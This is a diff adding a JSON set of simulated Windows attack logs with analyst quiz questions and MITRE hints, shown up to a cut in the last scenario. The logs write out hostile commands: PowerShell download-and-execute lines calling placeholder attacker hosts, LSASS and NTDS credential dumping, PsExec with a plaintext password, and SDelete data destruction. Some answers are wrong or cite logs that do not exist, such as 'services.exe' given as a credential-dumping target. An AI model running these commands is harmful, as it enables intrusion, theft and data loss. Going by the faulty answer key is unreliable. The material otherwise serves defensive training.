@@ -1,0 +1,1028 @@
+[
+  {
+    "name": "Phishing -> PowerShell Download",
+    "difficulty": "basic",
+    "logs": [
+      "Timestamp: 2023-10-26 10:05:12 | EventID: 4688 | Process: OUTLOOK.EXE | CommandLine: \"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
+      "Timestamp: 2023-10-26 10:05:35 | EventID: 4688 | Process: WINWORD.EXE | CommandLine: \"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\User\\Downloads\\Invoice_Urgent.docm\"",
+      "Timestamp: 2023-10-26 10:05:38 | EventID: 4688 | Process: POWERSHELL.EXE | CommandLine: powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://malicious-domain.xyz/payload.ps1'))\"",
+      "Timestamp: 2023-10-26 10:05:40 | EventID: 3 | Process: POWERSHELL.EXE | NetworkConnection: DestinationIP=198.51.100.10, DestinationPort=80",
+      "Timestamp: 2023-10-26 10:05:42 | EventID: 1 | Process: payload.exe | ParentProcess: POWERSHELL.EXE"
+    ],
+    "questions": [
+      {
+        "id": 1,
+        "text": "Which process executed a command to download a script from the internet?",
+        "answer": "POWERSHELL.EXE",
+        "relevant_log_indices": [2, 3],
+        "relevant_mitre_indices": [0, 1]
+      },
+      {
+        "id": 2,
+        "text": "What is the likely initial access vector based on the logs?",
+        "answer": "Phishing",
+        "relevant_log_indices": [0, 1],
+        "relevant_mitre_indices": [2]
+      },
+      {
+        "id": 3,
+        "text": "What is the domain name contacted by PowerShell?",
+        "answer": "malicious-domain.xyz",
+        "relevant_log_indices": [2],
+        "relevant_mitre_indices": [1]
+      }
+    ],
+    "mitre_hints": [
+      {
+        "tactic": "Execution (TA0002)",
+        "technique_name": "PowerShell",
+        "technique_id": "T1059.001",
+        "url": "https://attack.mitre.org/techniques/T1059/001/"
+      },
+      {
+        "tactic": "Command and Control (TA0011)",
+        "technique_name": "Ingress Tool Transfer",
+        "technique_id": "T1105",
+        "url": "https://attack.mitre.org/techniques/T1105/"
+      },
+      {
+        "tactic": "Initial Access (TA0001)",
+        "technique_name": "Phishing: Spearphishing Attachment",
+        "technique_id": "T1566.001",
+        "url": "https://attack.mitre.org/techniques/T1566/001/"
+      }
+    ]
+  },
+  {
+    "name": "Scheduled Task Malware C2",
+    "difficulty": "basic",
+    "logs": [
+      "Timestamp: 2023-11-15 08:00:00 | EventID: 4698 | TaskName: \\Microsoft\\Windows\\Update\\SystemUpdateTask | Action: schtasks.exe /create /tn SystemUpdateTask /tr C:\\Windows\\Temp\\update.exe /sc DAILY /st 08:00",
+      "Timestamp: 2023-11-16 08:00:01 | EventID: 4688 | Process: update.exe | CommandLine: C:\\Windows\\Temp\\update.exe",
+      "Timestamp: 2023-11-16 08:00:05 | EventID: 3 | Process: update.exe | NetworkConnection: DestinationIP=10.0.5.12, DestinationPort=443, Protocol=TCP",
+      "Timestamp: 2023-11-16 08:00:10 | EventID: 10 | Process: lsass.exe | TargetProcess: update.exe | AccessType: ReadProcessMemory",
+      "Timestamp: 2023-11-17 08:00:01 | EventID: 4688 | Process: update.exe | CommandLine: C:\\Windows\\Temp\\update.exe"
+    ],
+    "questions": [
+      {
+        "id": 1,
+        "text": "What mechanism is used for persistence?",
+        "answer": "Scheduled Task",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 2,
+        "text": "What is the name of the suspicious executable?",
+        "answer": "update.exe",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 3,
+        "text": "Which critical process did 'update.exe' interact with, suggesting potential credential dumping?",
+        "answer": "lsass.exe",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      }
+    ],
+    "mitre_hints": [
+      {
+        "tactic": "Persistence (TA0003)",
+        "technique_name": "Scheduled Task/Job: Scheduled Task",
+        "technique_id": "T1053.005",
+        "url": "https://attack.mitre.org/techniques/T1053/005/"
+      },
+      {
+        "tactic": "Execution (TA0002)",
+        "technique_name": "Scheduled Task/Job: Scheduled Task",
+        "technique_id": "T1053.005",
+        "url": "https://attack.mitre.org/techniques/T1053/005/"
+      },
+      {
+        "tactic": "Credential Access (TA0006)",
+        "technique_name": "OS Credential Dumping: LSASS Memory",
+        "technique_id": "T1003.001",
+        "url": "https://attack.mitre.org/techniques/T1003/001/"
+      },
+      {
+        "tactic": "Command and Control (TA0011)",
+        "technique_name": "Application Layer Protocol: Web Protocols",
+        "technique_id": "T1071.001",
+        "url": "https://attack.mitre.org/techniques/T1071/001/"
+      }
+    ]
+  },
+  {
+    "name": "Credential Dumping via LSASS",
+    "difficulty": "basic",
+    "logs": [
+      "Timestamp: 2023-12-01 14:30:00 | EventID: 10 | SourceName: Microsoft-Windows-Sysmon | ProcessGuid: {XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXX1} | ProcessId: 1234 | Image: C:\\Windows\\System32\\eviltool.exe | TargetProcessGuid: {YYYYYYYY-YYYY-YYYY-YYYY-YYYYYYYYYYYY} | TargetProcessId: 684 | TargetImage: C:\\Windows\\System32\\lsass.exe | GrantedAccess: 0x1010 | CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+a1b2c|...",
+      "Timestamp: 2023-12-01 14:30:01 | EventID: 4688 | ProcessName: C:\\Windows\\System32\\eviltool.exe | CommandLine: eviltool.exe --dump-lsass --output C:\\Windows\\Temp\\creds.dmp",
+      "Timestamp: 2023-12-01 14:30:05 | EventID: 11 | SourceName: Microsoft-Windows-Sysmon | ProcessGuid: {XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXX1} | ProcessId: 1234 | Image: C:\\Windows\\System32\\eviltool.exe | TargetFilename: C:\\Windows\\Temp\\creds.dmp | CreationUtcTime: 2023-12-01 14:30:05.123Z",
+      "Timestamp: 2023-12-01 14:32:10 | EventID: 3 | Process: eviltool.exe | NetworkConnection: DestinationIP=192.168.1.200, DestinationPort=8080, Protocol=TCP"
+    ],
+    "questions": [
+      {
+        "id": 1,
+        "text": "What is the name of the tool likely used for credential dumping?",
+        "answer": "eviltool.exe",
+        "relevant_log_indices": [0, 1, 2],
+        "relevant_mitre_indices": [0]
+      },
+      {
+        "id": 2,
+        "text": "Which system process was targeted by this tool?",
+        "answer": "lsass.exe",
+        "relevant_log_indices": [0],
+        "relevant_mitre_indices": [0]
+      },
+      {
+        "id": 3,
+        "text": "What is the name of the file where the dumped credentials might have been saved?",
+        "answer": "creds.dmp",
+        "relevant_log_indices": [1, 2],
+        "relevant_mitre_indices": [0]
+      },
+      {
+        "id": 4,
+        "text": "What Sysmon Event ID indicates process access (like reading memory)?",
+        "answer": "10",
+        "relevant_log_indices": [0],
+        "relevant_mitre_indices": [0]
+      }
+    ],
+    "mitre_hints": [
+      {
+        "tactic": "Credential Access (TA0006)",
+        "technique_name": "OS Credential Dumping: LSASS Memory",
+        "technique_id": "T1003.001",
+        "url": "https://attack.mitre.org/techniques/T1003/001/"
+      },
+      {
+        "tactic": "Exfiltration (TA0010)",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "technique_id": "T1041",
+        "url": "https://attack.mitre.org/techniques/T1041/"
+      }
+    ]
+  },
+  {
+    "name": "Registry Run Key Persistence",
+    "difficulty": "basic",
+    "logs": [
+      "Timestamp: 2024-01-10 11:20:05 | EventID: 4688 | Process: cmd.exe | CommandLine: cmd.exe /c powershell.exe -c (New-Object Net.WebClient).DownloadFile('http://badsite.example/updater.ps1', 'C:\\Users\\Public\\updater.ps1')",
+      "Timestamp: 2024-01-10 11:20:06 | EventID: 3 | Process: powershell.exe | NetworkConnection: DestinationIP=198.51.100.25, DestinationPort=80",
+      "Timestamp: 2024-01-10 11:20:10 | EventID: 4688 | Process: powershell.exe | CommandLine: powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\updater.ps1",
+      "Timestamp: 2024-01-10 11:20:11 | EventID: 13 | SourceName: Microsoft-Windows-Sysmon | EventType: RegistryValueSet | ProcessGuid: {ZZZZZZZZ-ZZZZ-ZZZZ-ZZZZ-ZZZZZZZZZZZ2} | ProcessId: 5678 | Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | TargetObject: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemUpdater | Details: C:\\Users\\Public\\updater.ps1"
+    ],
+    "questions": [
+      {
+        "id": 1,
+        "text": "What file was downloaded from the internet?",
+        "answer": "updater.ps1",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 2,
+        "text": "Where was the downloaded file saved?",
+        "answer": "C:\\Users\\Public\\updater.ps1",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 3,
+        "text": "What registry key was modified to achieve persistence?",
+        "answer": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 4,
+        "text": "What Sysmon EventType indicates a registry value was set?",
+        "answer": "RegistryValueSet",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      }
+    ],
+    "mitre_hints": [
+      {
+        "tactic": "Persistence (TA0003)",
+        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+        "technique_id": "T1547.001",
+        "url": "https://attack.mitre.org/techniques/T1547/001/"
+      },
+      {
+        "tactic": "Defense Evasion (TA0005)",
+        "technique_name": "Modify Registry",
+        "technique_id": "T1112",
+        "url": "https://attack.mitre.org/techniques/T1112/"
+      },
+      {
+        "tactic": "Execution (TA0002)",
+        "technique_name": "PowerShell",
+        "technique_id": "T1059.001",
+        "url": "https://attack.mitre.org/techniques/T1059/001/"
+      }
+    ]
+  },
+  {
+    "name": "Data Exfiltration via DNS",
+    "difficulty": "basic",
+    "logs": [
+      "Timestamp: 2024-01-15 09:05:00 | EventID: 4688 | Process: malware.exe | CommandLine: malware.exe -mode stealth",
+      "Timestamp: 2024-01-15 09:05:10 | EventID: 22 | SourceName: Microsoft-Windows-Sysmon | EventType: DnsQuery | ProcessGuid: {WWWWWWWW-WWWW-WWWW-WWWW-WWWWWWWWWWW3} | ProcessId: 9876 | Image: C:\\ProgramData\\hidden\\malware.exe | QueryName: ZGF0YT0icGFzc3dvcmQxMjMi.malware-c2.example | QueryStatus: 0 | QueryResults: -",
+      "Timestamp: 2024-01-15 09:05:12 | EventID: 22 | SourceName: Microsoft-Windows-Sysmon | EventType: DnsQuery | ProcessGuid: {WWWWWWWW-WWWW-WWWW-WWWW-WWWWWWWWWWW3} | ProcessId: 9876 | Image: C:\\ProgramData\\hidden\\malware.exe | QueryName: JmFjY291bnQ9ImFkbWluIg==.malware-c2.example | QueryStatus: 0 | QueryResults: -",
+      "Timestamp: 2024-01-15 09:05:15 | EventID: 22 | SourceName: Microsoft-Windows-Sysmon | EventType: DnsQuery | ProcessGuid: {WWWWWWWW-WWWW-WWWW-WWWW-WWWWWWWWWWW3} | ProcessId: 9876 | Image: C:\\ProgramData\\hidden\\malware.exe | QueryName: JmRvbWFpbj0iY29ycCI=.malware-c2.example | QueryStatus: 0 | QueryResults: -"
+    ],
+    "questions": [
+      {
+        "id": 1,
+        "text": "What process initiated the DNS queries?",
+        "answer": "malware.exe",
+        "relevant_log_indices": [1, 2, 3],
+        "relevant_mitre_indices": [2]
+      },
+      {
+        "id": 2,
+        "text": "What Sysmon Event ID corresponds to DNS Query events?",
+        "answer": "22",
+        "relevant_log_indices": [1, 2, 3],
+        "relevant_mitre_indices": [2]
+      },
+      {
+        "id": 3,
+        "text": "What is the base domain name used in the suspicious DNS queries?",
+        "answer": "malware-c2.example",
+        "relevant_log_indices": [1, 2, 3],
+        "relevant_mitre_indices": [2]
+      },
+      {
+        "id": 4,
+        "text": "What encoding is likely used for the data hidden in the DNS query subdomains?",
+        "answer": "Base64",
+        "relevant_log_indices": [1, 2, 3],
+        "relevant_mitre_indices": [0, 1]
+      }
+    ],
+    "mitre_hints": [
+      {
+        "tactic": "Exfiltration (TA0010)",
+        "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol",
+        "technique_id": "T1048.003",
+        "url": "https://attack.mitre.org/techniques/T1048/003/"
+      },
+      {
+        "tactic": "Command and Control (TA0011)",
+        "technique_name": "Data Encoding: Standard Encoding",
+        "technique_id": "T1132.001",
+        "url": "https://attack.mitre.org/techniques/T1132/001/"
+      },
+      {
+        "tactic": "Command and Control (TA0011)",
+        "technique_name": "Application Layer Protocol: DNS",
+        "technique_id": "T1071.004",
+        "url": "https://attack.mitre.org/techniques/T1071/004/"
+      }
+    ]
+  },
+  {
+    "name": "Lateral Movement via WMI",
+    "difficulty": "basic",
+    "logs": [
+      "Timestamp: 2024-02-10 11:30:05 | EventID: 4688 | Process: wmic.exe | CommandLine: wmic /node:WKSTN-VICTIM /user:DOMAIN\\Admin /password:PASSWORD process call create \"powershell.exe -enc BASE64_ENCODED_COMMAND\"",
+      "Timestamp: 2024-02-10 11:30:06 | Hostname: WKSTN-VICTIM | EventID: 4688 | Process: powershell.exe | CommandLine: powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil-server.com/beacon.ps1')\"",
+      "Timestamp: 2024-02-10 11:30:08 | Hostname: WKSTN-VICTIM | EventID: 3 | Process: powershell.exe | NetworkConnection: DestinationIP=192.0.2.55, DestinationPort=80",
+      "Timestamp: 2024-02-10 11:30:10 | Hostname: WKSTN-VICTIM | EventID: 4688 | Process: rundll32.exe | CommandLine: C:\\Windows\\System32\\rundll32.exe C:\\Users\\Public\\beacon.dll,EntryPoint"
+    ],
+    "questions": [
+      {
+        "id": 1,
+        "text": "What command-line utility was used to initiate the remote process execution?",
+        "answer": "wmic.exe",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 2,
+        "text": "What was the hostname of the target machine?",
+        "answer": "WKSTN-VICTIM",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 3,
+        "text": "What script was downloaded and executed by PowerShell?",
+        "answer": "beacon.ps1",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      }
+    ],
+    "mitre_hints": [
+      {
+        "tactic": "Execution (TA0002)",
+        "technique_name": "Windows Management Instrumentation",
+        "technique_id": "T1047",
+        "url": "https://attack.mitre.org/techniques/T1047/"
+      },
+      {
+        "tactic": "Lateral Movement (TA0008)",
+        "technique_name": "Windows Management Instrumentation",
+        "technique_id": "T1047",
+        "url": "https://attack.mitre.org/techniques/T1047/"
+      },
+      {
+        "tactic": "Execution (TA0002)",
+        "technique_name": "PowerShell",
+        "technique_id": "T1059.001",
+        "url": "https://attack.mitre.org/techniques/T1059/001/"
+      }
+    ]
+  },
+  {
+    "name": "Malicious Service Creation",
+    "difficulty": "basic",
+    "logs": [
+      "Timestamp: 2024-03-20 15:01:22 | EventID: 7045 | SourceName: Service Control Manager | ServiceName: BackupMgr | ServiceFileName: C:\\Windows\\System32\\bckmgr.exe | ServiceType: user mode service | ServiceStartType: auto start | ServiceAccount: LocalSystem",
+      "Timestamp: 2024-03-20 15:01:25 | EventID: 4688 | Process: services.exe | ParentProcess: wininit.exe",
+      "Timestamp: 2024-03-20 15:01:26 | EventID: 4688 | Process: bckmgr.exe | ParentProcess: services.exe | CommandLine: C:\\Windows\\System32\\bckmgr.exe",
+      "Timestamp: 2024-03-20 15:01:30 | EventID: 3 | Process: bckmgr.exe | NetworkConnection: DestinationIP=203.0.113.100, DestinationPort=443, Protocol=TCP",
+      "Timestamp: 2024-03-21 08:00:00 | EventID: 4688 | Process: bckmgr.exe | ParentProcess: services.exe | CommandLine: C:\\Windows\\System32\\bckmgr.exe"
+    ],
+    "questions": [
+      {
+        "id": 1,
+        "text": "What Event ID indicates that a new service was installed?",
+        "answer": "7045",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 2,
+        "text": "What is the name of the suspicious executable?",
+        "answer": "bckmgr.exe",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 3,
+        "text": "Which critical process did 'bckmgr.exe' interact with, suggesting potential credential dumping?",
+        "answer": "services.exe",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      }
+    ],
+    "mitre_hints": [
+      {
+        "tactic": "Persistence (TA0003)",
+        "technique_name": "Create or Modify System Process: Windows Service",
+        "technique_id": "T1543.003",
+        "url": "https://attack.mitre.org/techniques/T1543/003/"
+      },
+      {
+        "tactic": "Execution (TA0002)",
+        "technique_name": "Create or Modify System Process: Windows Service",
+        "technique_id": "T1543.003",
+        "url": "https://attack.mitre.org/techniques/T1543/003/"
+      },
+      {
+        "tactic": "Credential Access (TA0006)",
+        "technique_name": "OS Credential Dumping: LSASS Memory",
+        "technique_id": "T1003.001",
+        "url": "https://attack.mitre.org/techniques/T1003/001/"
+      },
+      {
+        "tactic": "Command and Control (TA0011)",
+        "technique_name": "Application Layer Protocol: Web Protocols",
+        "technique_id": "T1071.001",
+        "url": "https://attack.mitre.org/techniques/T1071/001/"
+      }
+    ]
+  },
+  {
+    "name": "Data Destruction via SDelete",
+    "difficulty": "basic",
+    "logs": [
+      "Timestamp: 2024-07-15 16:00:00 | Hostname: TEMP-SRV | EventID: 4688 | Process: sdelete64.exe | CommandLine: C:\\Users\\Admin\\Downloads\\SysinternalsSuite\\sdelete64.exe -p 3 -s -q C:\\CriticalData\\*",
+      "Timestamp: 2024-07-15 16:00:01 | Hostname: TEMP-SRV | EventID: 11 | Process: sdelete64.exe | TargetFilename: C:\\CriticalData\\FinancialReport_Q2.xlsx",
+      "Timestamp: 2024-07-15 16:00:02 | Hostname: TEMP-SRV | EventID: 26 | SourceName: Microsoft-Windows-Sysmon | EventType: FileDelete | ProcessGuid: {...} | ProcessId: 7890 | Image: C:\\Users\\Admin\\Downloads\\SysinternalsSuite\\sdelete64.exe | TargetFilename: C:\\CriticalData\\FinancialReport_Q2.xlsx | IsExecutable: false | Archived: false",
+      "Timestamp: 2024-07-15 16:00:05 | Hostname: TEMP-SRV | EventID: 11 | Process: sdelete64.exe | TargetFilename: C:\\CriticalData\\UserDatabase.csv",
+      "Timestamp: 2024-07-15 16:00:06 | Hostname: TEMP-SRV | EventID: 23 | SourceName: Microsoft-Windows-Sysmon | EventType: FileDeleteDetected | ProcessGuid: {...} | ProcessId: 7890 | Image: C:\\Users\\Admin\\Downloads\\SysinternalsSuite\\sdelete64.exe | TargetFilename: C:\\CriticalData\\UserDatabase.csv | IsExecutable: false"
+    ],
+    "questions": [
+      {
+        "id": 1,
+        "text": "What tool was used for data destruction?",
+        "answer": "sdelete64.exe",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 2,
+        "text": "What directory was targeted for deletion?",
+        "answer": "C:\\CriticalData",
+        "relevant_log_indices": [],
+        "relevant_mitre_indices": []
+      },
+      {
+        "id": 3,
+        "text": "What Sysmon Event IDs specifically track file deletion events? (List one)",
+        "answer": "23 or 26",
+        "relevant_log_indices": [2, 4],
+        "relevant_mitre_indices": []
+      }
+    ],
+    "mitre_hints": [
+      {
+        "tactic": "Impact (TA0040)",
+        "technique_name": "Data Destruction",
+        "technique_id": "T1485",
+        "url": "https://attack.mitre.org/techniques/T1485/"
+      }
+    ]
+  },
+  {
+    "name": "Advanced Persistent Threat (APT) Simulation",
+    "difficulty": "advanced",
+    "logs": [
+      "Timestamp: 2024-04-01 09:14:55 | Hostname: WEBSRV01 | EventID: 4625 | LogonType: 3 | Status: 0xC000006D | AccountName: Administrator | SourceNetworkAddress: 103.45.12.88",
+      "Timestamp: 2024-04-01 09:15:00 | Hostname: WEBSRV01 | EventID: 4625 | LogonType: 3 | Status: 0xC000006D | AccountName: Administrator | SourceNetworkAddress: 103.45.12.88",
+      "Timestamp: 2024-04-01 09:15:05 | Hostname: WEBSRV01 | EventID: 4625 | LogonType: 3 | Status: 0xC000006D | AccountName: Administrator | SourceNetworkAddress: 103.45.12.88",
+      "Timestamp: 2024-04-01 09:15:10 | EventID: 4624 | LogonType: 3 | AccountName: Administrator | SourceNetworkAddress: 103.45.12.88", 
+      "Timestamp: 2024-04-01 09:15:30 | Hostname: WEBSRV01 | EventID: 4688 | Process: svchost.exe | CommandLine: C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule",
+      "Timestamp: 2024-04-01 09:15:45 | Hostname: WEBSRV01 | EventID: 4688 | Process: cmd.exe | ParentProcess: explorer.exe | CommandLine: cmd.exe /c whoami", 
+      "Timestamp: 2024-04-01 09:15:50 | Hostname: WEBSRV01 | EventID: 4688 | Process: whoami.exe | ParentProcess: cmd.exe",
+      "Timestamp: 2024-04-01 09:16:00 | Hostname: WEBSRV01 | EventID: 4688 | Process: cmd.exe | ParentProcess: explorer.exe | CommandLine: cmd.exe /c systeminfo",
+      "Timestamp: 2024-04-01 09:16:10 | Hostname: WEBSRV01 | EventID: 4688 | Process: systeminfo.exe | ParentProcess: cmd.exe",
+      "Timestamp: 2024-04-01 09:16:30 | Hostname: WEBSRV01 | EventID: 4688 | Process: w3wp.exe | CommandLine: C:\\Windows\\System32\\inetsrv\\w3wp.exe -ap \"DefaultAppPool\" -v \"v4.0\" -l \"webengine4.dll\" -a \\\\.\\pipe\\iisipm1a2b3c4d -h \"C:\\inetpub\\temp\\apppools\\DefaultAppPool\\DefaultAppPool.config\" -w \"\" -m 0",
+      "Timestamp: 2024-04-01 09:17:05 | Hostname: WEBSRV01 | EventID: 4688 | Process: cmd.exe | ParentProcess: w3wp.exe | CommandLine: cmd.exe /c powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIAMwAuADQANQAvAHMAdABhAGcAZQByAC4AcABzADEAJwApACkA",
+      "Timestamp: 2024-04-01 09:17:08 | Hostname: WEBSRV01 | EventID: 3 | Process: powershell.exe | NetworkConnection: DestinationIP=192.168.23.45, DestinationPort=80, Protocol=TCP",
+      "Timestamp: 2024-04-01 09:17:10 | Hostname: WEBSRV01 | EventID: 11 | SourceName: Microsoft-Windows-Sysmon | Process: powershell.exe | TargetFilename: C:\\Windows\\Temp\\evil.exe | CreationUtcTime: 2024-04-01 09:17:10.123Z",
+      "Timestamp: 2024-04-01 09:17:15 | Hostname: WEBSRV01 | EventID: 10 | SourceName: Microsoft-Windows-Sysmon | TargetImage: C:\\Windows\\System32\\lsass.exe | GrantedAccess: 0x1FFFFF | SourceImage: C:\\Windows\\Temp\\evil.exe",
+      "Timestamp: 2024-04-01 09:18:00 | Hostname: WEBSRV01 | EventID: 22 | Process: svchost.exe | QueryName: time.windows.com",
+      "Timestamp: 2024-04-01 09:19:00 | Hostname: WEBSRV01 | EventID: 4624 | LogonType: 5 | AccountName: WEBSRV01$ | SourceNetworkAddress: -", 
+      "Timestamp: 2024-04-01 09:20:00 | Hostname: WEBSRV01 | EventID: 4688 | Process: net.exe | CommandLine: net group \"Domain Admins\" /domain",
+      "Timestamp: 2024-04-01 09:22:00 | Hostname: WEBSRV01 | EventID: 11 | SourceName: Microsoft-Windows-Sysmon | Process: SomeBrowser.exe | TargetFilename: C:\\Users\\Administrator\\Downloads\\PSTools.zip",
+      "Timestamp: 2024-04-01 09:23:00 | Hostname: WEBSRV01 | EventID: 4688 | Process: 7z.exe | CommandLine: 7z.exe x C:\\Users\\Administrator\\Downloads\\PSTools.zip -oC:\\Windows\\Temp\\",
+      "Timestamp: 2024-04-01 09:23:05 | Hostname: WEBSRV01 | EventID: 11 | Process: 7z.exe | TargetFilename: C:\\Windows\\Temp\\PsExec.exe",
+      "Timestamp: 2024-04-01 09:24:00 | Hostname: WEBSRV01 | EventID: 4688 | Process: cmd.exe | CommandLine: cmd /c ping DC01", 
+      "Timestamp: 2024-04-01 09:24:05 | Hostname: WEBSRV01 | EventID: 4688 | Process: ping.exe | CommandLine: ping.exe DC01",
+      "Timestamp: 2024-04-01 09:25:30 | Hostname: WEBSRV01 | EventID: 4688 | Process: psexec.exe | CommandLine: C:\\Windows\\Temp\\psexec.exe \\\\DC01 -u DOMAIN\\Administrator -p Password123 -d -s cmd.exe",
+      "Timestamp: 2024-04-01 09:25:35 | Hostname: DC01 | EventID: 4624 | LogonType: 3 | AccountName: Administrator | SourceNetworkAddress: 192.168.1.50",
+      "Timestamp: 2024-04-01 09:25:40 | Hostname: DC01 | EventID: 7045 | ServiceName: PSEXESVC | ServiceFileName: C:\\Windows\\PSEXESVC.exe",
+      "Timestamp: 2024-04-01 09:25:45 | Hostname: DC01 | EventID: 4688 | Process: cmd.exe | ParentProcess: PSEXESVC.exe",
+      "Timestamp: 2024-04-01 09:25:50 | Hostname: DC01 | EventID: 4688 | Process: whoami.exe | ParentProcess: cmd.exe",
+      "Timestamp: 2024-04-01 09:25:55 | Hostname: DC01 | EventID: 4688 | Process: hostname.exe | ParentProcess: cmd.exe", 
+      "Timestamp: 2024-04-01 09:26:00 | Hostname: DC01 | EventID: 4688 | Process: ntdsutil.exe | CommandLine: ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\Temp\\ntds_backup\" q q",
+      "Timestamp: 2024-04-01 09:28:00 | Hostname: DC01 | EventID: 4688 | Process: svchost.exe | CommandLine: C:\\Windows\\system32\\svchost.exe -k LocalSystemNetworkRestricted -p -s gpsvc", 
+      "Timestamp: 2024-04-01 09:30:00 | Hostname: WEBSRV01 | EventID: 3 | Process: powershell.exe | NetworkConnection: DestinationIP=103.45.12.90, DestinationPort=443, Protocol=TCP",
+      "Timestamp: 2024-04-01 09:30:05 | Hostname: DC01 | EventID: 11 | TargetFilename: C:\\Temp\\ntds_backup\\Active Directory\\ntds.dit" 
+    ],
+    "questions": [
+      {
+        "id": 1,
+        "text": "What was the likely initial point of compromise on WEBSRV01?",
+        "answer": "Web Application (exploited w3wp.exe)",
+        "relevant_log_indices": [9, 10, 11],
+        "relevant_mitre_indices": [0]
+      },
+      {
+        "id": 2,
+        "text": "What technique was used to gain execution after initial access on WEBSRV01? (MITRE ID)",
+        "answer": "T1059.001",
+        "relevant_log_indices": [11, 12, 13],
+        "relevant_mitre_indices": [1]
+      },
+      {
+        "id": 3,
+        "text": "What credential access technique was likely attempted on WEBSRV01?",
+        "answer": "LSASS Memory Dumping",
+        "relevant_log_indices": [14],
+        "relevant_mitre_indices": [2]
+      },
+      {
+        "id": 4,
+        "text": "How did the attacker likely move laterally from WEBSRV01 to DC01?",
+        "answer": "PsExec",
+        "relevant_log_indices": [23, 24, 25, 26],
+        "relevant_mitre_indices": [3]
+      },
+      {
+        "id": 5,
+        "text": "What sensitive file was likely exfiltrated from DC01?",
+        "answer": "ntds.dit",
+        "relevant_log_indices": [29, 32],
+        "relevant_mitre_indices": [4]
+      }
+    ],
+    "mitre_hints": [
+      {
+        "tactic": "Initial Access (TA0001)",
+        "technique_name": "Exploit Public-Facing Application",
+        "technique_id": "T1190",
+        "url": "https://attack.mitre.org/techniques/T1190/"
+      },
+      {
+        "tactic": "Execution (TA0002)",
+        "technique_name": "PowerShell",
+        "technique_id": "T1059.001",
+        "url": "https://attack.mitre.org/techniques/T1059/001/"
+      },
+      {
+        "tactic": "Credential Access (TA0006)",
+        "technique_name": "OS Credential Dumping: LSASS Memory",
+        "technique_id": "T1003.001",
+        "url": "https://attack.mitre.org/techniques/T1003/001/"
+      },
+      {
+        "tactic": "Lateral Movement (TA0008)",
+        "technique_name": "Remote Services: SMB/Windows Admin Shares",
+        "technique_id": "T1021.002",
+        "url": "https://attack.mitre.org/techniques/T1021/002/"
+      },
+      {
+        "tactic": "Collection (TA0009)",
+        "technique_name": "Data from Local System",
+        "technique_id": "T1005",
+        "url": "https://attack.mitre.org/techniques/T1005/"
+      },
+      {
+        "tactic": "Exfiltration (TA0010)",
+        "technique_name": "Exfiltration Over C2 Channel",
+        "technique_id": "T1041",
+        "url": "https://attack.mitre.org/techniques/T1041/"
+      }
+    ]
+  },
+  {
+    "name": "Ransomware Deployment Simulation",
+    "difficulty": "advanced",
+    "logs": [
+      "Timestamp: 2024-05-10 13:55:00 | Hostname: CLIENTPC05 | EventID: 4688 | Process: outlook.exe",
+      "Timestamp: 2024-05-10 14:00:00 | Hostname: CLIENTPC05 | EventID: 4688 | Process: OUTLOOK.EXE",
+      "Timestamp: 2024-05-10 14:05:15 | Hostname: CLIENTPC05 | EventID: 4688 | Process: explorer.exe | ParentProcess: OUTLOOK.EXE | CommandLine: explorer.exe C:\\Users\\finance_user\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\XYZ123\\Invoice_Update.js",
+      "Timestamp: 2024-05-10 14:05:16 | Hostname: CLIENTPC05 | EventID: 4688 | Process: wscript.exe | ParentProcess: explorer.exe | CommandLine: C:\\Windows\\System32\\wscript.exe C:\\Users\\finance_user\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\XYZ123\\Invoice_Update.js",
+      "Timestamp: 2024-05-10 14:05:20 | Hostname: CLIENTPC05 | EventID: 4688 | Process: powershell.exe | ParentProcess: wscript.exe | CommandLine: powershell -exec bypass -c (New-Object Net.WebClient).DownloadFile('http://drop.badsite.net/stage1.ps1', 'C:\\Users\\Public\\stage1.ps1'); Start-Process C:\\Users\\Public\\stage1.ps1",
